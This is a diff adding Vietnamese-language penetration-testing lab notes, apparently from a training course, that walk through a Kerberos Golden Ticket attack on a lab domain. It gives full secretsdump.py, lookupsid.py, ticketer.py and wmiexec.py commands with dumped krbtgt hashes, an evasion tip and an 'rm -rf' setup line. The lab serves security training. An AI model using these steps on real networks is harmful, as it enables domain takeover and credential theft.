@@ -6295,3 +6295,226 @@ Nếu có thêm thời gian, hãy sử dụng Hashcat với các từ điển đ
 ## Phần kết luận
 
 Trong bài thực hành này, chúng ta đã xem xét cách sử dụng người dùng miền có quyền quản trị để lấy bản sao của tệp NTDS.dit bằng cách sử dụng bản sao bóng (shadow copies). Sử dụng tệp này, chúng ta có thể trích xuất các mã băm mật khẩu cho bất kỳ người dùng hoặc tài khoản máy tính nào trong miền.
+
+# Lab 5.4. Silver Ticket
+
+# Lab 5.5. Golden Ticket
+
+Trước khi bắt đầu, vui lòng chạy lệnh này trong máy ảo Slingshot Linux của bạn.
+
+```bash
+rm -rf  /home/sec560/.local/bin
+```
+
+## Mục tiêu
+
+- Chúng tôi sẽ trích xuất các khóa Kerberos cho tài khoản `krbtgt`.
+
+- Chúng tôi sẽ tạo ra một tấm vé vàng với chìa khóa đã có được.
+
+- Chúng ta sẽ sử dụng tấm vé vàng để truy cập vào khu vực đó.
+
+## Thiết lập phòng thí nghiệm
+
+Máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+Bạn có thể ping (và phân giải) `dc01.hiboxy.com` từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 dc01.hiboxy.com
+```
+
+![alt text](IMG/LAB5/LAB5.5/image.png)
+
+## Hướng dẫn thực hành từng bước
+
+Chúng ta sẽ truy cập vào DC cho `hiboxy.com` miền. Hãy nhớ rằng `SVC_SQLService2` trong bài thực hành Kerberoast, chúng ta đã xâm nhập được vào tài khoản Quản trị viên miền, một tài khoản có quyền quản trị miền. Từ đây, mục tiêu của chúng ta là lấy được mã băm (hash) của tài krbtgtkhoản, mà chúng ta có thể sử dụng để tạo ra một vé vàng (golden ticket).
+
+### 1. Trích xuất thông tin bí mật của tài khoản krbtgt
+
+Chúng ta sẽ cố gắng trích xuất thông tin bí mật của tài krbtgtkhoản từ bộ điều khiển miền, sử dụng thông tin đăng nhập tài khoản Quản trị viên miền mà chúng ta đã thu hồi được trong bài thực hành Kerberos. Secretsdump.py là một phần của bộ công cụ Impacket `secretsdump.py` tuyệt vời .
+
+Tài khoản quản trị viên miền được khôi phục trong phòng thí nghiệm Kerberos là:
+
+- Domain: `hiboxy.com`.
+
+- Tên người dùng: `SVC_SQLService2`.
+
+- Mật khẩu: `^Cakemaker`.
+
+Xin nhắc lại, để tạo ra một "vé vàng" hợp lệ, chúng ta cần trích xuất mã băm mật khẩu NTLM (chính là khóa mã hóa Kerberos) của tài khoản `krbtgt`. Cú pháp của lệnh như sau:
+
+```bash
+secretsdump.py domain/username@target options
+```
+
+Chúng ta cũng có thể thêm vào `:password` sau tên người dùng để tiết kiệm thời gian nếu chúng ta định sử dụng lại cùng một lệnh (hoặc lệnh tương tự).
+
+Chúng ta sẽ sử dụng `-just-dc-user` tùy chọn này để trích xuất mã băm mật khẩu cho tài khoản `krbtgt`.
+
+Sử dụng lệnh `secretsdump.py` để lấy mã băm mật khẩu của tài khoản `krbtgt`: 
+
+```bash
+secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 -just-dc-user krbtgt
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-4.png)
+
+```txt
+sec560@slingshot:~$ secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 -just-dc-user krbtgt
+Impacket v0.10.1.dev1+20220907.172745.1fe2bbb3 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8b721d95caf73176b4451406715c1c58:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:17d060e0b3ac2435e308cf58c616eb9155aca4d48a51e44ef2b9ba4f1d06712a
+krbtgt:aes128-cts-hmac-sha1-96:6e24d0af10c7a58031bf681f9d9d0f11
+krbtgt:des-cbc-md5:5d3bf7869e75c275
+[*] Cleaning up...
+sec560@slingshot:~$
+```
+
+Kết quả của lệnh sẽ hiển thị rõ ràng các khóa Kerberos được trích xuất. Trong kết quả ở trên, bạn sẽ thấy cả mã băm NT (là khóa mã hóa RC4) và khóa mã hóa AES đều được trích xuất! Tuyệt vời!
+
+> Thay đổi băm NTLM: Mã băm NT ở đây đã được cố ý sửa đổi. Mã băm này được Windows tạo ngẫu nhiên khi xây dựng phòng thí nghiệm nên chúng tôi không thể chia sẻ giá trị này trước!
+
+### 2. Truy xuất thông tin tên miền để tạo vé vàng
+
+Ở bước trước, chúng ta đã thu được thông tin quan trọng nhất (và khó có được nhất) để tạo ra tấm vé vàng, đó là mã băm mật khẩu của tài khoản `krbtgt` được sử dụng để mã hóa TGT.
+
+Tuy nhiên, vẫn còn một số thông tin nữa về tên miền mà chúng ta cần thu thập để tạo ra "Golden Ticket" thành công.
+
+Đầu tiên, chúng ta cần biết tên miền đầy đủ (fully qualified domain name) của miền đó. Chúng ta có thể tìm thấy thông tin này bằng cách thực hiện lệnh `ipconfig /all` trên máy mục tiêu đã tham gia vào miền đó.
+
+Sử dụng lệnh `wmiexec.py` với `ipconfig /all` để lấy tên miền:
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 ipconfig /all
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-5.png)
+
+Tên miền đầy đủ (FQDN) sẽ nằm trong `Primary DNS Suffix` phần đó, trong trường hợp của chúng ta là `hiboxy.com`. Tất nhiên, chúng ta đã biết điều đó rồi, nhưng xác nhận lại cũng không thừa.
+
+Chúng ta cũng cần SID của tên miền. Để tìm được SID này, chúng ta sẽ sử dụng `lookupsid.py` - một công cụ khác từ bộ công cụ Impacket. Tập lệnh này sử dụng cùng cú pháp nhắm mục tiêu như các lệnh Impacket đã sử dụng trước đó.
+
+Chạy `lookupsid.py` lệnh bằng cách sử dụng thông tin mục tiêu tương tự như trước đó trong bài thực hành. Chúng ta sẽ lấy được các RID từ 5 đến 520 (nhưng không bao gồm 520) bằng lệnh này:
+
+```bash
+lookupsid.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 520
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-6.png)
+
+```txt
+root@slingshot:/home/sec560# lookupsid.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 520
+Impacket v0.10.1.dev1+20220907.172745.1fe2bbb3 - Copyright 2022 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 10.130.10.10
+[*] StringBinding ncacn_np:10.130.10.10[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1165364801-2165540956-2109386109
+498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: HIBOXY\Administrator (SidTypeUser)
+501: HIBOXY\Guest (SidTypeUser)
+502: HIBOXY\krbtgt (SidTypeUser)
+512: HIBOXY\Domain Admins (SidTypeGroup)
+513: HIBOXY\Domain Users (SidTypeGroup)
+514: HIBOXY\Domain Guests (SidTypeGroup)
+515: HIBOXY\Domain Computers (SidTypeGroup)
+516: HIBOXY\Domain Controllers (SidTypeGroup)
+517: HIBOXY\Cert Publishers (SidTypeAlias)
+518: HIBOXY\Schema Admins (SidTypeGroup)
+519: HIBOXY\Enterprise Admins (SidTypeGroup)
+```
+
+SID của tên miền sẽ xuất hiện ở đầu kết quả. Nó bắt đầu bằng `S-1-5` (xem phần văn bản được tô sáng ở trên).
+
+> SID của tên miền sẽ khác: SID hiển thị ở trên (S-1-5-21-1165364801-2165540956-2109386109) sẽ khác với những gì bạn thấy. Hãy sử dụng giá trị trên màn hình của bạn! Giá trị này được tạo ngẫu nhiên khi môi trường được xây dựng.
+
+### 3. Tạo một tấm vé vàng
+
+Với những thông tin trên, giờ đây chúng ta có thể tạo ra tấm vé vàng của mình. Từ máy Slingshot, chúng ta có thể thực hiện điều này bằng cách sử dụng `ticketer.py` - một công cụ khác từ bộ phần mềm Impacket! Trên máy tính Windows, bạn cũng có thể sử dụng các công cụ như Mimikatz hoặc Rubeus!
+
+Sử dụng `ticketer.py` đoạn mã với các tùy chọn sau:
+
+- `domain`: Tên miền mục tiêu là hiboxy.com.
+
+- `domain-sid`: Mã định danh bảo mật (SID) của miền mục tiêu.
+
+- `nthash`: Chúng ta sẽ tạo một vé vàng RC4 TGT bằng cách sử dụng mã băm NT mà chúng ta đã đánh cắp trước đó.
+
+- Cuối cùng, chúng tôi xác nhận rằng chúng tôi muốn tạo một "vé vàng" cho `Administrator` tài khoản.
+
+```bash
+ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-1165364801-2165540956-2109386109 -nthash 8b721d95caf73176b4451406715c1c58 Administrator
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-7.png)
+
+> SID và mã băm của tên miền sẽ khác nhau: Cả SID tên miền và mã băm NT của tài khoản krbtgt đều được tạo ngẫu nhiên khi xây dựng phòng thí nghiệm. Bạn cần sử dụng các giá trị hiển thị trên màn hình, chứ không phải các giá trị được hiển thị trong phòng thí nghiệm này!
+
+Một lưu ý nhỏ về việc né tránh: Nếu muốn cuộc tấn công trở nên kín đáo hơn, chúng ta sẽ chọn cách đánh cắp khóa AES của tài khoản `krbtgt` và tạo ra một "Golden Ticket" bằng AES thay vì RC4. Trong môi trường thông thường, AES là loại mã hóa Kerberos phổ biến hơn và việc sử dụng RC4 là một điều bất thường cần được điều tra thêm.
+
+### 4. Sử dụng tấm vé vàng
+
+Trong một tình huống thực tế, "vé vàng" có thể được tải vào bộ nhớ trên một máy tính đã tham gia miền để lấy lại quyền quản trị viên miền. Cần hết sức cẩn trọng khi sử dụng phương pháp này trong quá trình kiểm thử xâm nhập. Thông thường, việc tạo ra "vé vàng" được coi là nằm ngoài phạm vi kiểm thử, tuy nhiên chúng tôi thấy việc giải thích nguyên tắc này trong khóa học kiểm thử xâm nhập hàng đầu của mình là rất hữu ích.
+
+Để cung cấp một số tài liệu tham khảo, tấm vé vàng giờ đây có thể được tải vào bộ nhớ bằng các công cụ như Mimikatz (Windows):
+
+```bash
+# Ví dụ lệnh (Không thực thi)
+
+kerberos::ptt C:\Tools\Mimikatz\x64\ticket.kirbi
+```
+
+Hoặc bộ phần mềm Impacket (Linux):
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+Hãy sử dụng vé để truy cập vào hệ thống `file01.hiboxy.com` (10.130.10.45). Chúng ta có thể sử dụng lại tập lệnh `wmiexec.py`, nhưng thay vì chỉ định thông tin đăng nhập, chúng ta có thể sử dụng `-k` xác thực Kerberos và `-no-pass` do đó không cần phải chỉ định mật khẩu. Chúng ta cũng cần chỉ định `-dc-ip 10.130.10.10` để cho `wmiexec` biết địa chỉ IP của bộ điều khiển miền.
+
+Giờ thì, hãy tấn công thôi!
+
+Sau khi xuất tệp vé `Administrator.ccache`, bạn có thể sử dụng bất kỳ công cụ nào từ bộ công cụ Impacket, chẳng hạn như `wmiexec` hoặc `psexec` bằng cách sử dụng `-k -no-pass` các đối số.
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+wmiexec.py -k -no-pass -dc-ip 10.130.10.10 file01.hiboxy.com hostname
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-8.png)
+
+### 5. Một vé khác
+
+Chúng ta đã sử dụng tài khoản đó `Administrator`. Hãy xem điều gì sẽ xảy ra nếu chúng ta thử sử dụng một tên người dùng và ID giả mạo, giống như chúng ta đã làm với bài thực hành Silver Ticket.
+
+Tạo vé vàng với tên người dùng giả là `pwned`:
+
+> SID và Hash đã thay đổi: SID tên miền và NT Hash hiển thị bên dưới sẽ không khớp với những gì bạn thấy trên màn hình. Hãy sử dụng giá trị trên màn hình của bạn thay cho các giá trị hiển thị ở đây.
+
+```bash
+ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-1165364801-2165540956-2109386109 -nthash 8b721d95caf73176b4451406715c1c58 pwned
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-9.png)
+
+Hãy sử dụng vé mới và hỏi `file01.hiboxy.com` tên người dùng của bạn là gì bằng lệnh `whoami`.
+
+```bash
+export KRB5CCNAME=pwned.ccache
+wmiexec.py -k -no-pass -dc-ip 10.130.10.10 file01.hiboxy.com whoami
+```
+
+![alt text](IMG/LAB5/LAB5.5/image-10.png)
+
+Do một bản vá lỗi, các bộ điều khiển miền Windows 2019 đã cài đặt bản vá sẽ xác thực tên người dùng để đảm bảo nó khớp với ID (số). Cuộc tấn công này không thành công ở đây vì chúng tôi đang sử dụng mạng Windows đã được cập nhật đầy đủ, nhưng nó có thể thành công trong các bài kiểm tra thâm nhập của bạn!
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã xem xét cách sử dụng người dùng miền có quyền quản trị để lấy khóa Kerberos từ người dùng `krbtgt` . Thông tin này, cùng với thông tin miền dễ dàng truy xuất được, chẳng hạn như tên miền đủ điều kiện (FFN) và SID miền, cho phép chúng ta tạo ra một "vé vàng" và sử dụng vé này để truy cập vào miền với quyền quản trị.
+
